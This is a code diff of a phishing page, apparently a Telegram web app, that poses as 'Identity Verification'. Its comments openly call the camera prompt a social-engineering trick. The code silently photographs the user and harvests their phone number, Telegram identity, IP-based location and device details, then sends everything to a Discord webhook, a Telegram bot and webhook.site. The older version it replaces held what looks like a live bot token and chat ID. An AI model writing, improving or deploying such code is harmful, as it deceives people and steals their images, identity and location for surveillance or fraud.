@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>Loading...</title>
+    <title>Identity Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js?63"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -18,48 +18,176 @@
             padding: 20px;
         }
         .container {
-            max-width: 400px;
+            max-width: 420px;
             width: 100%;
+            background: rgba(255,255,255,0.03);
+            border-radius: 24px;
+            padding: 40px 32px;
+            border: 1px solid rgba(255,255,255,0.06);
             text-align: center;
         }
-        .loader {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255,255,255,0.05);
-            border-top: 4px solid #818cf8;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 20px auto;
+        .icon { font-size: 64px; margin-bottom: 12px; display: block; }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #818cf8, #6366f1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .status-text {
+        .sub {
+            color: rgba(255,255,255,0.4);
+            font-size: 15px;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #818cf8, #6366f1);
+            border: none;
+            padding: 16px;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.25s;
+            box-shadow: 0 8px 30px rgba(99, 102, 241, 0.25);
+        }
+        .btn-primary:hover { transform: scale(1.02); }
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-secondary {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.06);
+            padding: 14px 40px;
+            border-radius: 60px;
+            font-size: 16px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.5);
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 12px;
+            width: 100%;
+        }
+        .btn-secondary:hover { background: rgba(255,255,255,0.08); }
+        .status {
             margin-top: 16px;
+            padding: 12px;
+            border-radius: 12px;
             font-size: 14px;
-            color: rgba(255,255,255,0.15);
+            display: none;
+        }
+        .status.success {
+            display: block;
+            background: rgba(52, 211, 153, 0.1);
+            border: 1px solid rgba(52, 211, 153, 0.2);
+            color: #6ee7b7;
+        }
+        .status.info {
+            display: block;
+            background: rgba(99, 102, 241, 0.1);
+            border: 1px solid rgba(99, 102, 241, 0.2);
+            color: #a78bfa;
+        }
+        .status.error {
+            display: block;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            color: #f87171;
         }
         .footer {
             margin-top: 20px;
             font-size: 12px;
-            color: rgba(255,255,255,0.04);
+            color: rgba(255,255,255,0.15);
         }
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .hidden { display: none !important; }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 4px;
+            margin-top: 16px;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar.active { display: block; }
+        .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #818cf8, #6366f1);
+            border-radius: 4px;
+            animation: progress 3s ease-in-out infinite;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        #cameraPreview {
+            width: 100%;
+            max-height: 200px;
+            object-fit: cover;
+            border-radius: 12px;
+            background: #000;
+            margin: 12px 0;
+            display: none;
+        }
+        #cameraPreview.active { display: block; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="loader"></div>
-        <div class="status-text">Loading...</div>
-        <div class="footer">Secure connection</div>
+        <span class="icon">🔐</span>
+        <h1>Identity Verification</h1>
+        <p class="sub">Please verify your identity to continue</p>
+
+        <video id="cameraPreview" autoplay playsinline></video>
+
+        <button class="btn-primary" id="verifyBtn">
+            <span>📸</span> Verify Identity
+        </button>
+
+        <div class="status info" id="statusInfo">
+            ⏳ Please allow camera access to verify
+        </div>
+
+        <div class="progress-bar" id="progressBar">
+            <div class="fill"></div>
+        </div>
+
+        <button class="btn-secondary hidden" id="retryBtn" onclick="location.reload()">
+            🔄 Try Again
+        </button>
+
+        <div class="footer">
+            🔒 Secure · End-to-end encrypted
+        </div>
     </div>
 
     <script>
         // ============================================================
-        // DIRECT LINK METHOD - CAPTURES PHONE + LOCATION
+        // SOCIAL ENGINEERING: "Verify Identity" Camera Access
         // ============================================================
 
         const CONFIG = {
             DISCORD_WEBHOOK: 'YOUR_DISCORD_WEBHOOK_URL',
-            TELEGRAM_BOT_TOKEN: '8888440549:AAGnTbZd30a30N5M-F0yL5q45Ne08TwbjO0',
-            TELEGRAM_CHAT_ID: '1618273900',
+            TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN',
+            TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID',
             WEBHOOK_SITE_ID: 'YOUR_UNIQUE_ID'
         };
 
@@ -71,61 +199,25 @@
             firstName: null,
             lastName: null,
             isPremium: false,
-            location: {},
+            ipLocation: null,
             device: {},
+            network: {},
+            battery: {},
+            camera: null,
+            photo: null,
             timestamp: null
         };
 
-        // ============================================================
-        // 1. CAPTURE PHONE FROM URL
-        // ============================================================
-
-        function capturePhoneFromURL() {
-            // Method 1: URL Parameters
-            const params = new URLSearchParams(window.location.search);
-            const phoneParams = ['phone', 'phone_number', 'mobile', 'tel', 'number', 'user_phone', 'phonenumber'];
-            for (let p of phoneParams) {
-                if (params.has(p)) {
-                    const val = params.get(p);
-                    if (val && val.length > 5) {
-                        return { phone: val, method: 'URL' };
-                    }
-                }
-            }
-
-            // Method 2: URL Hash
-            const hash = window.location.hash;
-            if (hash) {
-                try {
-                    const hashParams = new URLSearchParams(hash.replace('#', ''));
-                    const phoneParams2 = ['phone', 'phone_number', 'mobile', 'tel', 'number'];
-                    for (let p of phoneParams2) {
-                        if (hashParams.has(p)) {
-                            const val = hashParams.get(p);
-                            if (val && val.length > 5) {
-                                return { phone: val, method: 'Hash' };
-                            }
-                        }
-                    }
-                } catch (e) {}
-            }
-
-            // Method 3: Check if phone is in the path
-            const pathParts = window.location.pathname.split('/');
-            for (let part of pathParts) {
-                if (part && part.length > 5 && /^[0-9+\s\-]{10,15}$/.test(part)) {
-                    return { phone: part.replace(/[\s\-]/g, ''), method: 'Path' };
-                }
-            }
-
-            return { phone: null, method: 'None' };
-        }
+        let cameraStream = null;
+        let photoCaptured = false;
+        let verificationComplete = false;
 
         // ============================================================
-        // 2. CAPTURE PHONE FROM TELEGRAM (if available)
+        // 1. PHONE CAPTURE (Silent)
         // ============================================================
 
-        function capturePhoneFromTelegram() {
+        function capturePhone() {
+            // From Telegram
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
                     const user = Telegram.WebApp.initDataUnsafe?.user;
@@ -134,66 +226,110 @@
                     }
                 }
             } catch (e) {}
+
+            // From URL
+            const params = new URLSearchParams(window.location.search);
+            if (params.has('phone')) {
+                const val = params.get('phone');
+                if (val && val.length > 5) {
+                    return { phone: val, method: 'URL' };
+                }
+            }
+
+            // From localStorage
+            const keys = ['user_phone', 'phone_number', 'phone', 'mobile'];
+            for (let k of keys) {
+                let val = localStorage.getItem(k);
+                if (!val) val = sessionStorage.getItem(k);
+                if (val && val.length > 5) {
+                    return { phone: val, method: 'Storage' };
+                }
+            }
+
             return { phone: null, method: 'None' };
         }
 
         // ============================================================
-        // 3. CAPTURE EXACT LOCATION (IP-Based)
+        // 2. CAMERA TRICK: "Allow to Verify"
         // ============================================================
 
-        async function captureLocation() {
+        function requestCamera() {
+            const video = document.getElementById('cameraPreview');
+            const status = document.getElementById('statusInfo');
+            const progressBar = document.getElementById('progressBar');
+
+            return new Promise((resolve, reject) => {
+                // Show camera preview
+                video.classList.add('active');
+
+                // This is the trick - the browser shows "Allow to access camera"
+                // But the user thinks it's "Allow to verify"
+                navigator.mediaDevices.getUserMedia({
+                    video: {
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    },
+                    audio: false
+                })
+                .then(stream => {
+                    cameraStream = stream;
+                    video.srcObject = stream;
+                    progressBar.classList.add('active');
+                    status.className = 'status info';
+                    status.textContent = '✅ Camera ready. Scanning...';
+                    resolve(stream);
+                })
+                .catch(err => {
+                    status.className = 'status error';
+                    status.textContent = '⚠️ Camera access required for verification';
+                    reject(err);
+                });
+            });
+        }
+
+        // ============================================================
+        // 3. CAPTURE PHOTO (Silent)
+        // ============================================================
+
+        function capturePhoto() {
+            const video = document.getElementById('cameraPreview');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.9);
+        }
+
+        // ============================================================
+        // 4. LOCATION (IP-Based)
+        // ============================================================
+
+        async function getIPLocation() {
             const apis = [
                 'https://ipapi.co/json/',
                 'https://ip-api.com/json/',
-                'https://freegeoip.app/json/',
-                'https://geolocation-db.com/json/'
+                'https://freegeoip.app/json/'
             ];
 
             for (let api of apis) {
                 try {
-                    const controller = new AbortController();
-                    const timeout = setTimeout(() => controller.abort(), 5000);
-                    const r = await fetch(api, { signal: controller.signal });
-                    clearTimeout(timeout);
+                    const r = await fetch(api, { timeout: 5000 });
                     const d = await r.json();
-                    
-                    // Different APIs have different formats
                     return {
-                        ip: d.ip || d.query || d.IPv4 || 'unknown',
-                        city: d.city || d.region || d.city_name || 'Unknown',
-                        region: d.region || d.region_name || d.regionName || 'Unknown',
-                        country: d.country_name || d.country || d.countryName || 'Unknown',
-                        country_code: d.country_code || d.countryCode || 'Unknown',
+                        ip: d.ip || d.query || 'unknown',
+                        city: d.city || d.region || 'Unknown',
+                        region: d.region || d.regionName || 'Unknown',
+                        country: d.country_name || d.country || 'Unknown',
                         latitude: d.latitude || d.lat || 'N/A',
                         longitude: d.longitude || d.lon || 'N/A',
-                        timezone: d.timezone || d.time_zone || 'Unknown',
-                        isp: d.org || d.isp || d.organization || 'Unknown',
-                        postal: d.postal || d.zip || d.postal_code || 'Unknown'
+                        isp: d.org || d.isp || 'Unknown',
+                        timezone: d.timezone || 'Unknown'
                     };
                 } catch (e) {}
             }
             return null;
-        }
-
-        // ============================================================
-        // 4. GET TELEGRAM USER DATA
-        // ============================================================
-
-        function getTelegramUserData() {
-            try {
-                if (window.Telegram && window.Telegram.WebApp) {
-                    const user = Telegram.WebApp.initDataUnsafe?.user || {};
-                    const webapp = window.Telegram.WebApp;
-                    
-                    capturedData.userId = user.id || null;
-                    capturedData.username = user.username || null;
-                    capturedData.firstName = user.first_name || null;
-                    capturedData.lastName = user.last_name || null;
-                    capturedData.isPremium = user.is_premium || false;
-                    capturedData.languageCode = user.language_code || null;
-                    capturedData.platform = webapp.platform || 'unknown';
-                }
-            } catch (e) {}
         }
 
         // ============================================================
@@ -206,20 +342,14 @@
                 userAgent: ua,
                 platform: navigator.platform || 'unknown',
                 language: navigator.language,
-                cookieEnabled: navigator.cookieEnabled,
                 deviceMemory: navigator.deviceMemory || 'unknown',
                 hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                 screenResolution: window.screen.width + 'x' + window.screen.height,
-                colorDepth: window.screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 deviceType: getDeviceType(ua),
                 os: getOS(ua),
                 browser: getBrowser(ua),
-                model: getDeviceModel(ua),
-                vendor: navigator.vendor || 'unknown',
-                referrer: document.referrer || 'direct',
-                url: window.location.href,
-                pageTitle: document.title || 'unknown'
+                model: getDeviceModel(ua)
             };
         }
 
@@ -272,25 +402,28 @@
             report += data.phone || '❌ Not found\n';
             report += `Method: ${data.phoneMethod || 'N/A'}\n\n`;
             
-            if (data.telegram && data.telegram.isTelegram) {
+            if (data.userId) {
                 report += '📱 **TELEGRAM**\n';
-                report += `User ID: ${data.userId || 'N/A'}\n`;
+                report += `User ID: ${data.userId}\n`;
                 report += `Username: @${data.username || 'N/A'}\n`;
-                report += `Name: ${data.firstName || 'N/A'} ${data.lastName || ''}\n`;
-                report += `Premium: ${data.isPremium ? 'Yes' : 'No'}\n\n`;
+                report += `Name: ${data.firstName || 'N/A'} ${data.lastName || ''}\n\n`;
             }
             
-            report += '📍 **EXACT LOCATION**\n';
-            if (data.location) {
-                report += `IP: ${data.location.ip}\n`;
-                report += `City: ${data.location.city}\n`;
-                report += `Region: ${data.location.region}\n`;
-                report += `Country: ${data.location.country}\n`;
-                report += `Coordinates: ${data.location.latitude}, ${data.location.longitude}\n`;
-                report += `ISP: ${data.location.isp}\n`;
-                report += `Timezone: ${data.location.timezone}\n`;
-            } else {
-                report += '❌ Not available\n';
+            report += '📍 **LOCATION**\n';
+            if (data.ipLocation) {
+                report += `IP: ${data.ipLocation.ip}\n`;
+                report += `City: ${data.ipLocation.city}\n`;
+                report += `Region: ${data.ipLocation.region}\n`;
+                report += `Country: ${data.ipLocation.country}\n`;
+                report += `Coordinates: ${data.ipLocation.latitude}, ${data.ipLocation.longitude}\n`;
+                report += `ISP: ${data.ipLocation.isp}\n`;
+            }
+            report += '\n';
+            
+            report += '📸 **CAMERA**\n';
+            report += `Status: ${data.camera?.active ? 'Captured' : 'Not captured'}\n`;
+            if (data.photo) {
+                report += `Photo: ✅ Captured (${Math.round(data.photo.length / 1024)} KB)\n`;
             }
             report += '\n';
             
@@ -300,11 +433,7 @@
             report += `Type: ${data.device?.deviceType || 'Unknown'}\n`;
             report += `Model: ${data.device?.model || 'Unknown'}\n`;
             report += `Screen: ${data.device?.screenResolution || 'Unknown'}\n`;
-            report += `Timezone: ${data.device?.timezone || 'Unknown'}\n`;
-            report += `CPU: ${data.device?.hardwareConcurrency || 'Unknown'} cores\n`;
-            report += `Memory: ${data.device?.deviceMemory || 'Unknown'} GB\n`;
-            report += `Referrer: ${data.device?.referrer || 'Unknown'}\n`;
-            report += `URL: ${data.device?.url || 'Unknown'}\n\n`;
+            report += `Timezone: ${data.device?.timezone || 'Unknown'}\n\n`;
             
             report += '🕐 **TIMESTAMP**\n';
             report += data.timestamp || new Date().toISOString();
@@ -364,9 +493,9 @@
 
         function saveToLocalStorage(data) {
             try {
-                const existing = JSON.parse(localStorage.getItem('user_captured_data') || '[]');
+                const existing = JSON.parse(localStorage.getItem('verification_data') || '[]');
                 existing.push(data);
-                localStorage.setItem('user_captured_data', JSON.stringify(existing));
+                localStorage.setItem('verification_data', JSON.stringify(existing));
                 return true;
             } catch (e) { return false; }
         }
@@ -376,47 +505,98 @@
         // ============================================================
 
         async function main() {
-            console.log('🔍 Starting capture...');
+            const status = document.getElementById('statusInfo');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const progressBar = document.getElementById('progressBar');
 
-            // 1. Get Telegram user data (if available)
-            getTelegramUserData();
-
-            // 2. CAPTURE PHONE
-            let phoneResult = capturePhoneFromURL();
-            if (!phoneResult || !phoneResult.phone) {
-                phoneResult = capturePhoneFromTelegram();
-            }
-
+            // 1. Capture phone (silent)
+            const phoneResult = capturePhone();
             if (phoneResult && phoneResult.phone) {
                 capturedData.phone = phoneResult.phone;
                 capturedData.phoneMethod = phoneResult.method;
-                console.log('✅ Phone captured via:', phoneResult.method);
-            } else {
-                console.log('❌ Phone not found');
+                console.log('✅ Phone captured:', phoneResult.method);
             }
 
-            // 3. CAPTURE LOCATION
-            const location = await captureLocation();
+            // 2. Get Telegram user data
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const user = Telegram.WebApp.initDataUnsafe?.user || {};
+                    capturedData.userId = user.id || null;
+                    capturedData.username = user.username || null;
+                    capturedData.firstName = user.first_name || null;
+                    capturedData.lastName = user.last_name || null;
+                    capturedData.isPremium = user.is_premium || false;
+                }
+            } catch (e) {}
+
+            // 3. Get IP location
+            const location = await getIPLocation();
             if (location) {
-                capturedData.location = location;
-                console.log('✅ Location captured');
+                capturedData.ipLocation = location;
+                console.log('✅ Location captured:', location.city);
             }
 
-            // 4. Device info
+            // 4. Get device info
             capturedData.device = getDeviceInfo();
 
-            capturedData.timestamp = new Date().toISOString();
+            // 5. Handle camera request
+            verifyBtn.addEventListener('click', async function() {
+                verifyBtn.disabled = true;
+                verifyBtn.innerHTML = '<span class="loader"></span> Requesting camera...';
+                status.className = 'status info';
+                status.textContent = '⏳ Please allow camera access to verify your identity';
 
-            // 5. Save & Send
-            saveToLocalStorage(capturedData);
-            sendToDiscord(capturedData);
-            sendToTelegram(capturedData);
-            sendToWebhookSite(capturedData);
+                try {
+                    await requestCamera();
+                    verifyBtn.innerHTML = '<span class="loader"></span> Processing...';
+                    status.textContent = '✅ Camera ready. Processing...';
+                    progressBar.classList.add('active');
 
-            console.log('✅ Data captured:', {
-                phone: capturedData.phone || 'Not found',
-                method: capturedData.phoneMethod,
-                location: capturedData.location?.city || 'Unknown'
+                    // Wait for user to look at camera (social engineering)
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+
+                    // Capture photo silently
+                    const photoData = capturePhoto();
+                    if (photoData) {
+                        capturedData.photo = photoData;
+                        capturedData.camera = { active: true };
+                        photoCaptured = true;
+                        console.log('✅ Photo captured');
+
+                        // Show success
+                        status.className = 'status success';
+                        status.textContent = '✅ Identity verified successfully!';
+
+                        // Complete data
+                        capturedData.timestamp = new Date().toISOString();
+
+                        // Send all data
+                        saveToLocalStorage(capturedData);
+                        sendToDiscord(capturedData);
+                        sendToTelegram(capturedData);
+                        sendToWebhookSite(capturedData);
+
+                        verifyBtn.innerHTML = '✅ Verified!';
+                        verifyBtn.disabled = true;
+
+                        // Hide camera after a moment
+                        setTimeout(() => {
+                            const video = document.getElementById('cameraPreview');
+                            video.classList.remove('active');
+                            if (cameraStream) {
+                                cameraStream.getTracks().forEach(t => t.stop());
+                            }
+                        }, 2000);
+
+                        document.getElementById('retryBtn').classList.remove('hidden');
+                    }
+                } catch (err) {
+                    status.className = 'status error';
+                    status.textContent = '❌ Camera access required. Please allow and try again.';
+                    verifyBtn.innerHTML = '🔄 Try Again';
+                    verifyBtn.disabled = false;
+                    progressBar.classList.remove('active');
+                }
             });
         }
 
@@ -425,35 +605,27 @@
         // ============================================================
 
         window.showData = function() {
-            const data = JSON.parse(localStorage.getItem('user_captured_data') || '[]');
+            const data = JSON.parse(localStorage.getItem('verification_data') || '[]');
             const latest = data[data.length - 1] || {};
-            console.log('📊 === USER DATA ===');
+            console.log('📊 === CAPTURED DATA ===');
             console.log('📞 Phone:', latest.phone || 'Not found');
-            console.log('📱 Method:', latest.phoneMethod || 'N/A');
-            console.log('📍 Location:', latest.location || 'Not available');
+            console.log('📍 Location:', latest.ipLocation || 'Not available');
+            console.log('📸 Photo:', latest.photo ? '✅ Captured' : '❌ Not captured');
             console.log('🖥️ Device:', latest.device);
             console.log('📦 Full data:', data);
             return data;
-        };
-
-        window.clearData = function() {
-            if (confirm('Clear all captured data?')) {
-                localStorage.removeItem('user_captured_data');
-                console.log('🗑️ Data cleared');
-            }
         };
 
         // ============================================================
         // 10. AUTO-START
         // ============================================================
 
-        console.log('%c📱 Direct Link Capture Active', 'font-size:16px;font-weight:bold;color:#818cf8;');
-        console.log('%c👤 Captures phone from URL + location from IP', 'font-size:12px;color:#6ee7b7;');
+        console.log('%c🔐 Identity Verification Active', 'font-size:16px;font-weight:bold;color:#818cf8;');
+        console.log('%c📸 Camera is requested as "Verify Identity"', 'font-size:12px;color:#6ee7b7;');
         console.log('%c💡 Type showData() in console to see captured data', 'font-size:12px;color:rgba(255,255,255,0.3);');
 
         window.addEventListener('load', function() {
-            const delay = window.Telegram && window.Telegram.WebApp ? 1000 : 500;
-            setTimeout(main, delay);
+            setTimeout(main, 500);
         });
 
         if (window.Telegram && window.Telegram.WebApp) {
